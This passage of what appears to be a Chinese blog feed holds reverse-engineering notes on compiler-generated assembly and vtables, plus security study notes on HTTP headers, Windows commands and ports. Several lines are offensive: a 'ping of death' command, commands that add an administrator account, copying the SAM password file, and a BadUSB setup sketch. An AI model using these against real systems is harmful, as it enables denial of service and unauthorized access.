无符号除法，除数非2ⁿ</h4><p>32位：x*c&gt;&gt;32&gt;&gt;n[(x-(x*c&gt;&gt;32)&gt;&gt;n₁)+((x*c&gt;&gt;32)&gt;&gt;n₂)]</p><p>64位：x*c&gt;&gt;64&gt;&gt;n[(x-(x*c&gt;&gt;64)&gt;&gt;n₁)+((x*c&gt;&gt;64)&gt;&gt;n₂)]</p><h2 id="整数取模"><a class="markdownIt-Anchor" href="#整数取模"></a> 整数取模</h2><h3 id="除数为2n"><a class="markdownIt-Anchor" href="#除数为2n"></a> 除数为2ⁿ</h3><p>优化1：x大于等于0，x%2ⁿ=x&amp;(2ⁿ-1)， x小于0，(x&amp;(2ⁿ-1))-1|(~(2ⁿ-1))+1</p><p>优化2：x大于等于0，x&amp;(2ⁿ-1)，x小于0，(x+(2ⁿ-1)&amp;(2ⁿ-1))-(2ⁿ-1)</p><h3 id="除数非2n"><a class="markdownIt-Anchor" href="#除数非2n"></a> 除数非2ⁿ</h3><p>编译器一般采用余数=被除数-商x除数的优化方式</p><p>公式x%c=x-x/c*c</p><h2 id="控制语句"><a class="markdownIt-Anchor" href="#控制语句"></a> 控制语句</h2><h3 id="if-then-else"><a class="markdownIt-Anchor" href="#if-then-else"></a> if-then-else</h3><p>通俗点说是，使用jnz之类的语句跳过条件成立（不成立）的语句，执行结束再跳走。</p><h3 id="switch-case"><a class="markdownIt-Anchor" href="#switch-case"></a> switch-case</h3><p>利用cmp与传入的数值相比，je之类进行跳转，执行结束jmp或call。jmp dword ptr[4*eax+004010b0]相当与switch（a）</p><p>当case大于等于6时，且case值间距比较小时，编译器会采用case表的方式实现switch语句。思路是先把所有要跳转的case位置放置一个一维数组表（case表），将case的值作为数组的下标进行跳转。</p><p>当case项数较多时，会按大于小于关系形成判断树。</p><h3 id="循环语句"><a class="markdownIt-Anchor" href="#循环语句"></a> 循环语句</h3><h4 id="for语句"><a class="markdownIt-Anchor" href="#for语句"></a> for语句</h4><p>使用cmp、ecx寄存器和jle之类的指令进行判断是否跳出循环。</p><p>特征：for循环也会出现向上跳转的情况。与while循环不同的是，在这里前面多了一个jmp。for循环的jxx需要取反。</p><h4 id="while语句"><a class="markdownIt-Anchor" href="#while语句"></a> while语句</h4><p>在循环中jxx判断是否满足条件，条件不为true，则跳出循环。</p><h3 id="do循环语句"><a class="markdownIt-Anchor" href="#do循环语句"></a> do循环语句</h3><p>在最后的结尾，形成判断跳转语句。特征：有一个jxx用于向上跳转，而且跳转不到start。</p><h2 id="虚函数"><a class="markdownIt-Anchor" href="#虚函数"></a> 虚函数</h2><p>虚函数时程序运行时定义的函数。虚函数的地址不能在编译的时候确定，只能在调用的时候确定。所有虚函数的引用都放在虚函数表(Virtual Table，VTBL)这个数组里，数组的每个元素存放的就是类中虚函数的地址，采用两次间接寻址的方式，即先取(Virtual Table Pointer，VPTR)，得到VTBL表的地址再从VTBL表中取出虚函数的地址。</p><p>函数在入口处使用lea reg,off_xxxxxxxx和mov [reg],reg，返回值为this指针的，可以怀疑这个函数是构造函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">虚函数特征总结：<br>如果一个类至少有一个虚函数，这个类就有一个指向虚表的指针<br>不同的类虚表不同，相同的类对象共享一个虚表<br>虚表指针存放在对象首地址处<br>虚表地址在全局数据区中<br>虚表的每个元素都指向一个类成员函数指针（8字节）<br>虚表不一定以0结尾<br>虚表的成员函数顺序，按照类声明的顺序排列<br>虚表在构造函数中会被初始化<br>虚表在析构函数中会被赋值<br></code></pre></td></tr></table></figure><h3 id="继承虚表"><a class="markdownIt-Anchor" href="#继承虚表"></a> 继承虚表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">构造函数：<br>调用虚基类构造函数（多个按照继承顺序调用）<br>调用普通基类构造函数（多个按照继承顺序调用）<br>调用对象成员函数的构造函数（多个按照定义顺序调用）<br>调用派生构造函数<br>析构函数：<br>调用派生构造函数<br>调用对象成员函数的构造函数（多个按照定义顺序调用）<br>调用普通基类构造函数（多个按照继承顺序调用）<br>调用虚基类构造函数（多个按照继承顺序调用）<br><br><br>多重继承与单重继承唯一区别：是派生类新增的虚函数挂在第一个虚表后面。<br>多重继承虚表的特点也可以作为判断依据。<br></code></pre></td></tr></table></figure><h3 id="菱形继承虚表"><a class="markdownIt-Anchor" href="#菱形继承虚表"></a> 菱形继承虚表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">菱形继承是指在多重继承中，两个子类继承同一个父类，又有子类同时继承者两个子类。解决方法：虚继承<br>特征识别：<br>发现构造函数多传了一个，就可以怀疑这个类层次带有虚继承<br>如果发现构造函数里有初始化虚基类偏移表的操作，就可以怀疑这个类继承层次带有虚继承<br><br><br>根据调用基类构造函数标志来决定是否要调用虚基类的构造函数，如果为1，表示要调用虚基类构造函数；<br>为了方便定位在派生类内存中只存在一份的虚基类对象的内存位置，做了一个虚基类偏移表；其共8字节，后4字节用于表示虚基类在当前虚基类偏移表中的偏移<br>虚基类偏移表也在全局数据区，但只要看里面的数据，就能与虚区表分开。<br></code></pre></td></tr></table></figure><h3 id="抽象类虚表"><a class="markdownIt-Anchor" href="#抽象类虚表"></a> 抽象类虚表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">带有纯虚函数的是抽象类，不能实例化对象。找到抽象类，可通过抽象类的构造函数就可以定位这个抽象类的所有子类，得到所有重要功能的代码。<br>父类为抽象类的实现代码和单重继承没有太大区别，唯一区别是虚表。<br>纯虚函数没有实现代码，编译器默认填充了_purecall函数的地址，其功能是显示一个错误并退出程序。<br>特征：如果发现一个类的虚表里有_purecall虚表项，就可以怀疑这个类是抽象类。<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web学习笔记</title>
      <link href="/2020/07/20/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/07/20/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="http头部"><a class="markdownIt-Anchor" href="#http头部"></a> Http头部</h1><h2 id="响应码"><a class="markdownIt-Anchor" href="#响应码"></a> 响应码</h2><p>1xx：信息，请求收到，继续处理</p><p>2xx：成功，行为被成功地接受、理解和采纳</p><p>3xx：重定向，为了完成请求，必须进一步执行的动作</p><p>4xx：客户端错误，请求包含语法错误或者请求无法实现</p><p>5xx：服务器错误，服务器不能实现一种明显无效的请求</p><h3 id="via"><a class="markdownIt-Anchor" href="#via"></a> Via</h3><p>列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求</p><h3 id="user-agent"><a class="markdownIt-Anchor" href="#user-agent"></a> User-Agent</h3><p>浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;<br />rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14</p><h3 id="referer"><a class="markdownIt-Anchor" href="#referer"></a> Referer</h3><p>浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br />例如：Referer：<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></p><h3 id="proxy-authenticate"><a class="markdownIt-Anchor" href="#proxy-authenticate"></a> Proxy-Authenticate</h3><p>代理服务器响应浏览器，要求其提供代理身份验证信息。</p><h3 id="proxy-authorization"><a class="markdownIt-Anchor" href="#proxy-authorization"></a> Proxy-Authorization</h3><p>浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</p><h3 id="content-encoding"><a class="markdownIt-Anchor" href="#content-encoding"></a> Content-Encoding</h3><p>WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。<br />例如：Content-Encoding：gzip</p><h3 id="content-language"><a class="markdownIt-Anchor" href="#content-language"></a> Content-Language</h3><p>WEB 服务器告诉浏览器自己响应的对象的语言。</p><h3 id="content-length"><a class="markdownIt-Anchor" href="#content-length"></a> Content-Length</h3><p>WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012</p><h3 id="content-range"><a class="markdownIt-Anchor" href="#content-range"></a> Content-Range</h3><p>WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。<br />例如：Content-Range: bytes 21010-47021/47022</p><h3 id="content-type"><a class="markdownIt-Anchor" href="#content-type"></a> Content-Type</h3><p>WEB 服务器告诉浏览器自己响应的对象的类型。<br />例如：Content-Type：application/xml</p><h1 id="搭建网站"><a class="markdownIt-Anchor" href="#搭建网站"></a> 搭建网站</h1><h2 id="iis-60搭建aspsqlserver网站环境"><a class="markdownIt-Anchor" href="#iis-60搭建aspsqlserver网站环境"></a> IIS 6.0搭建ASP+SqlServer网站环境</h2><p>可以在虚拟机上安装window server服务器 也可以在 实体机上开启IIS 服务；sqlserver 就直接安装 和 安装manage ；之后设置好服务器的conn 的连接设置；注意要将wwwroot 目录下的 inc 文件夹设置给Internet来宾访问权限</p><p>1、同IP 不同端口 不配置主机头</p><p>2、不同ip地址，同端口</p><p>3、同ip 同端口 不同的主机头</p><h1 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h1><h2 id="windows-文件结构"><a class="markdownIt-Anchor" href="#windows-文件结构"></a> Windows 文件结构</h2><h3 id="windowssystem32configsam"><a class="markdownIt-Anchor" href="#windowssystem32configsam"></a> Windows/system32/config/SAM</h3><p>此目录下 的SAM是保存账号密码的，开机即加锁</p><p>解决方法：使用PE将其copy出来</p><p>●Windows:存放操作系统主要文件，非常重要。Temp:存放系统或其他软件临时文件， PerfLogs: Windows Vista或Windows 系统日志，记录如磁盘扫描错误等信息，没有必要删除。●Drivers: 部分驱动程序的文件夹。Favorites:收藏夹。●Program Files: 应用程序文件夹，一 般软件默认都安装在这里，也有一些系统自带的应用程序。在Windows 系统中，64位用户会多出一-个ProgramFiles (X86) 文件夹，这是系统中32位软件的安装目录。</p><h3 id="windowssystem32driversetchosts"><a class="markdownIt-Anchor" href="#windowssystem32driversetchosts"></a> Windows/system32/drivers/etc/hosts</h3><p>域名解析的功能</p><h2 id="window服务"><a class="markdownIt-Anchor" href="#window服务"></a> Window服务</h2><h3 id="服务的管理"><a class="markdownIt-Anchor" href="#服务的管理"></a> <strong>服务的管理</strong></h3><p>①用命令行管理- -②通过SCM管理</p><h3 id="编写服务程序的语言"><a class="markdownIt-Anchor" href="#编写服务程序的语言"></a> 编写服务程序的语言</h3><p>可以使用c++ 和 c# 编写服务程序</p><h3 id="服务的启动类型"><a class="markdownIt-Anchor" href="#服务的启动类型"></a> 服务的启动类型</h3><p>1，自动</p><p>2，手动</p><p>3，禁止</p><h3 id="三种登录方式"><a class="markdownIt-Anchor" href="#三种登录方式"></a> 三种登录方式</h3><p>Local System（本地系统）</p><p>Network service（网络服务）</p><p>Local Service（本地服务）</p><h3 id="net"><a class="markdownIt-Anchor" href="#net"></a> net</h3><p>–&gt;只能启停止,不能配查。</p><p>net用于打开没有被禁用的服务，语法是：</p><p>net start 服务名一&gt;启动服务</p><p>net stop 服务名一&gt;停止服务</p><h3 id="sc"><a class="markdownIt-Anchor" href="#sc"></a> sc</h3><p>sc query 服务名 -----查询服务 可以不带参数 结果是所有服务信息</p><p>​       sc stop/start 服务名 ----开启/关闭服务</p><p>sc qc 服务名 -----查运行状态</p><p>sc config /？------在注册表和服务数据库中修改服务项</p><p>sc create 服务名 type= 类型 binpath= 路径</p><p>——&gt;创建服务</p><p>sc delete 服务名 —删除服务</p><h3 id="wmic-service-get列出所有服务"><a class="markdownIt-Anchor" href="#wmic-service-get列出所有服务"></a> wmic service get–&gt;列出所有服务</h3><p>脚本检查服务中是否有路径解析漏洞：wmic service get name,displayname,pathname,startmode,startname|findstr /i “Auto” |findstr /i /v “C:\Windows” |findstr /i /v “”&quot;</p><h3 id="findstr"><a class="markdownIt-Anchor" href="#findstr"></a> findstr</h3><p>FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/F:file][/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]strings [[drive:][path]filename[ …]]</p><p>参数</p><p>/B 在一行的开始配对模式。</p><p>/E 在一行的结尾配对模式。</p><p>/L 按字使用搜索字符串。</p><p>/R 将搜索字符串作为一般表达式使用。</p><p>/S 在当前目录和所有子目录中搜索匹配文件。</p><p>/I 指定搜索不分大小写。</p><p>/X 打印完全匹配的行。</p><p>/V 只打印不包含匹配的行。</p><p>/N 在匹配的每行前打印行数。</p><p>/M 如果文件含有匹配项，只打印其文件名。</p><p>/O 在每个匹配行前打印字符偏移量。</p><p>/P 忽略有不可打印字符的文件。</p><p>/OFF[LINE] 不跳过带有脱机属性集的文件。</p><p>/A:attr 指定有十六进位数字的颜色属性。请见 “color /?”</p><p>/F:file 从指定文件读文件列表 (/ 代表控制台)。</p><p>/C:string 使用指定字符串作为文字搜索字符串。</p><p>/G:file 从指定的文件获得搜索字符串。 (/ 代表控制台)。</p><p>/D:dir 查找以分号为分隔符的目录列表　strings 要查找的文字。</p><p>[drive:][path]filename　指定要查找的文件。除非参数有 /C 前缀，请使用空格隔开搜索字符串。</p><h2 id="windows端口"><a class="markdownIt-Anchor" href="#windows端口"></a> <strong>Windows</strong>端口</h2><h3 id="http协议代理服务器常用端口号"><a class="markdownIt-Anchor" href="#http协议代理服务器常用端口号"></a> http协议代理服务器常用端口号</h3><p>80/8080/3128/9080/8081</p><h3 id="端口0服务reserved"><a class="markdownIt-Anchor" href="#端口0服务reserved"></a> 端口：0服务：Reserved</h3><p>通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。</p><h3 id="端口1服务tcpmux"><a class="markdownIt-Anchor" href="#端口1服务tcpmux"></a> 端口：1服务：tcpmux</h3><p>这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p><h3 id="端口7服务echo"><a class="markdownIt-Anchor" href="#端口7服务echo"></a> 端口：7服务：Echo</h3><p>能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。</p><h3 id="端口19服务character-generator"><a class="markdownIt-Anchor" href="#端口19服务character-generator"></a> 端口：19服务：Character Generator</h3><p>这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p><h3 id="端口21服务ftp"><a class="markdownIt-Anchor" href="#端口21服务ftp"></a> 端口：21服务：FTP</h3><p>FTP服务器所开放的端口，用于上传、下载</p><h3 id="端口22服务ssh"><a class="markdownIt-Anchor" href="#端口22服务ssh"></a> 端口：22服务：ssh</h3><p>PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。</p><h3 id="端口23服务telnet"><a class="markdownIt-Anchor" href="#端口23服务telnet"></a> 端口：23服务：Telnet</h3><p>Telnet远程登录</p><h3 id="其他端口"><a class="markdownIt-Anchor" href="#其他端口"></a> 其他端口</h3><h3 id="端口25服务smtp"><a class="markdownIt-Anchor" href="#端口25服务smtp"></a> 端口：25服务：SMTP</h3><p>说明：SMTP服务器所开放的端口，用于发送邮件。</p><p>端口：31服务：MSG Authentication说明：木马Master Paradise、Hackers Paradise开放此端口。</p><p>端口：42服务：WINS Replication说明：WINS复制</p><p>端口：53服务：Domain Name Server（DNS）说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此端口。</p><p>端口：67服务：Bootstrap Protocol Server说明：通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p><h3 id="端口69服务trival-file-transfer"><a class="markdownIt-Anchor" href="#端口69服务trival-file-transfer"></a> 端口：69服务：Trival File Transfer</h3><p>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何文件。它们也可用于系统写入文件。</p><p>端口：79服务：Finger Server说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p><p>端口：80服务：HTTP说明：用于网页浏览。木马Executor开放此端口。</p><p>端口：99服务：Metagram Relay说明：后门程序ncx99开放此端口。</p><p>端口：102服务：Message transfer agent(MTA)-X.400 over TCP/IP说明：消息传输代理。</p><p>端口：109服务：Post Office Protocol -Version3说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p><p>端口：110服务：SUN公司的RPC服务所有端口说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p><p>端口：113服务：Authentication Service说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在防火墙另一边与E-MAIL服务器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p><p>端口：119服务：Network News Transfer Protocol说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。</p><p>端口：135服务：Location Service说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。</p><p>端口：137、138、139服务：NETBIOS Name Service说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。</p><p>端口：143服务：Interim Mail Access Protocol v2说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。</p><p>端口：161服务：SNMP说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p>端口：177服务：X Display Manager Control Protocol说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。</p><p>端口：389服务：LDAP、ILS说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p><p>端口：443服务：Https说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。</p><p>端口：445 服务：Windows默认配置下，启动的共享服务，众多木马常用端口。</p><p>端口：456服务：[NULL]说明：木马HACKERS PARADISE开放此端口。</p><p>端口：513服务：Login,remote login说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p><p>端口：544服务：[NULL]说明：kerberos kshell</p><p>端口：548服务：Macintosh,File Services(AFP/IP)说明：Macintosh,文件服务。</p><p>端口：553服务：CORBA IIOP（UDP）说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p><p>端口：555服务：DSF说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。</p><p>端口：568服务：Membership DPA说明：成员资格DPA。</p><p>端口：569服务：Membership MSN说明：成员资格MSN。</p><p>端口：635服务：mountd说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于2049端口。</p><p>端口：636服务：LDAP说明：SSL（Secure Sockets layer）</p><p>端口：666服务：Doom Id Software说明：木马Attack FTP、Satanz Backdoor开放此端口</p><p>端口：993服务：IMAP说明：SSL（Secure Sockets layer）</p><p>端口：1001、1011服务：[NULL]说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。</p><p>端口：1024服务：Reserved说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a将会看到Telnet被分配1024端口。还有SQL session也用此端口和5000端口。</p><p>端口：1025、1033服务：1025：network blackjack 1033：[NULL]说明：木马netspy开放这2个端口。</p><p>端口：1080服务：SOCKS说明：这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。</p><p>端口：1170服务：[NULL]说明：木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此端口。</p><p>端口：1234、1243、6711、6776服务：[NULL]说明：木马SubSeven2.0、Ultors Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。</p><p>端口：1245服务：[NULL]说明：木马Vodoo开放此端口。</p><p>端口：1433服务：SQL说明：Microsoft的SQL服务开放的端口。</p><p>端口：1492服务：stone-design-1说明：木马FTP99CMP开放此端口。</p><p>端口：1500服务：RPC client fixed port session queries说明：RPC客户固定端口会话查询</p><p>端口：1503服务：NetMeeting T.120说明：NetMeeting T.120</p><p>端口：1524服务：ingress说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p><h2 id="windows常用注册表"><a class="markdownIt-Anchor" href="#windows常用注册表"></a> Windows常用注册表</h2><p><img src= "/img/loading.gif" data-src="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/image-20200119104643340.png" alt="image-20200119104643340" /></p><h2 id="常用dos命令"><a class="markdownIt-Anchor" href="#常用dos命令"></a> 常用Dos命令</h2><p>color 改变cmd颜色</p><p>ping -t -l 65550 ip  死亡ping（发送大于64k的文件并一直ping就成了死亡之ping）</p><p>ipconfig 查看ip</p><p>ipconfig /release 释放ip</p><p>ipconfig /renew 重新获取ip</p><p>systeminfo 查看系统信息</p><p>arp -a</p><p>net view 查看局域网内其他计算机名称</p><p>shutdown -s -t 180 -c “字符串”</p><p>shutdown -a 取消 -s 关机 -r 重启</p><p>start <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  打开网页</p><p>start 123.txt 打开123.txt(使用记事本打开)</p><p>type 123.txt（类似cat）读取文件信息</p><p>copy con c:\123.txt 创建 123.txt</p><p>copy b.jpg/b+b.txt/a c.jpg 图片后追加文本</p><p>ctrl + z 回车</p><p>md 目录名 创建目录</p><p>rd 目录名 删除文件夹</p><p>ren 原文件名 新文件名 重命名</p><p>del  删除文件</p><p>net use g:  \\192.168.100.202\c$ 将远程主机（192.168.100.202）的c盘映射到本机的g盘（此盘的盘符不能与本地磁盘的盘符重复）</p><p>net start  查看开启哪些服务</p><p>net start 服务名  开启服务</p><p>net stop 服务名 停止某服务</p><p>net user 用户名 密码 /add  建立用户</p><p>net user 用户名 密码 在没有/add 的情况下是直接修改密码的（有可能无法执行）</p><p>net user guest  /active:yes 激活guest用户</p><p>net user 查看有哪些用户</p><p>net localGroup Administrators  用户名 /add 把“用户”添加到管理员中使其具有管理员权限 注意事项：administrator 后加s 用复数形式</p><p>net user guest 123 用guest 登录后 将密码改为 123</p><p>net share 查看本地开启的共享</p><p>net share ipc$ 开启ipc共享</p><p>net share ipc$ /del 删除ipc共享</p><p>net share c$ /del 删除c共享</p><p>netstat -a 查看开启了哪些端口 常用搭配为netstat -an</p><p>netstat -n 查看端口的网络连接情况，常用netstat -an</p><p>netstat -v 查看正在进行的工作</p><p>at id号 开启已注册的某个计划任务</p><p>at /delete 停止所有计划任务，使用参数/yes则不需要确认就直接停止</p><p>at ID号 /delete 停止某个已注册的计划任务</p><p>at 查看所有计划任务</p><p>attrib 文件名（目录名） 查看某文件（目录）的属性</p><p>attrib 文件名 -A -R -S -H 或者 +A +R +S +H去掉（添加）某文件的存档，只读，系统 ，隐藏属性</p><h2 id="windows操作系统快捷键"><a class="markdownIt-Anchor" href="#windows操作系统快捷键"></a> windows操作系统快捷键</h2><p>F1 显示当前程序或者windows的帮助内容。</p><p>F2 当你选中一个文件，则表示重命名</p><p>ALT +F4 关闭当前应用程序中的当前文本（记事本 、word）</p><p>F5 刷新</p><p>CTRL + F5 强制刷新</p><p>CTRL + F6 切换到当前应用程序的下一个文本 （加 shift 可以跳转到前一个窗口）</p><p>F10 或者ALT 激活当前程序的菜单栏</p><p>windows键 或 Ctrl+ ESC 打开开始菜单</p><p>Ctrl+ alt+delete 在 win9x中打开关闭程序对话框</p><p>delete  文件放入回收站</p><p>shift + delete 直接删除不放入回收站</p><p>Ctrl+ shift+ ESC 打开任务管理器</p><p>Ctrl + n 新建一个新的文件</p><p>Ctrl + O 打开“打开文件”对话框</p><p>Ctrl + P 打开“打印”对话框</p><p>Ctrl + s 保存当前操作</p><p>Ctrl+ y 重做</p><p>win+ m 最小化所有被打开窗口</p><p>Ctrl + f 查找</p><h2 id="windows登录密码破解"><a class="markdownIt-Anchor" href="#windows登录密码破解"></a> Windows登录密码破解</h2><h3 id="u盘破解"><a class="markdownIt-Anchor" href="#u盘破解"></a> u盘破解</h3><p>u盘装载pe，使用pe破解</p><h3 id="使用工具破解"><a class="markdownIt-Anchor" href="#使用工具破解"></a> 使用工具破解</h3><h4 id="lc5"><a class="markdownIt-Anchor" href="#lc5"></a> lc5</h4><p>本质上是暴力破解，找hash值</p><h4 id="彩虹表"><a class="markdownIt-Anchor" href="#彩虹表"></a> 彩虹表</h4><h2 id="木马查找"><a class="markdownIt-Anchor" href="#木马查找"></a> 木马查找</h2><p>通过MSConfig 和注册表regedit 查找</p><h1 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h1><p>/proc/cpuinfo</p><p>/proc/meminfo</p><p>du -sh 文件目录 显示文件夹大小</p><h1 id="dns服务器"><a class="markdownIt-Anchor" href="#dns服务器"></a> DNS服务器</h1><p>服务器判定顺序： 本地缓存-&gt; 本地数据 -&gt;转发器</p><p>dns 查询同一个服务器可以通过不同的域名访问</p><p>攻击方式：dns 缓存中毒 、dns 劫持 、dns ddos</p><h1 id="badusb"><a class="markdownIt-Anchor" href="#badusb"></a> BADUSB</h1><p>使用工具生成服务端程序：</p><p>填写好信息rec地址和端口号</p><p>安装名称：最好为系统软件名称</p><p>按照自己需要勾选对应的选项</p><p>以上工具实现 ，可以自己写一个，也可以找工具生成一个</p><p>接受信息的服务器将入站规则修改为允许该端口号入站即可</p><p>使用软件：arduino 写入程序</p><h1 id="虚拟机"><a class="markdownIt-Anchor" href="#虚拟机"></a> 虚拟机</h1><p>vmware虚拟机解决桥接没有网络的问题：登录虚拟机后，进入编辑，找虚拟网络编辑器，打开高级选项，把自动获取网卡的换成指定的有网络的网卡</p><p>vmware 虚拟网络编辑器可以修改网卡网络问题</p><p>VMware添加新网络本质上就是添加新网卡；修改/etc/network/interfaces 的内容 添加网卡信息例：auto eth2</p><p>iface eth2 inet dhcp//动态获取ip；之后再添加一个网络适配器</p><h2 id="ssh"><a class="markdownIt-Anchor" href="#ssh"></a> ssh</h2><p>kali 默认是不允许使用root登录ssh的，所以要修改/etc/ssh/ssh_config的内容，改为允许root登录:</p><p>permitrootlogin yes</p><p>passwordAuthentication yes</p><h1 id="主机探测"><a class="markdownIt-Anchor" href="#主机探测"></a> 主机探测</h1><p>osi七层模型：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层</p><p>tcp/ip模型：物理层、数据链路层、网络层、传输层、应用层</p><h2 id="二层发现数据链路层"><a class="markdownIt-Anchor" href="#二层发现数据链路层"></a> 二层发现（数据链路层）</h2><h3 id="arping"><a 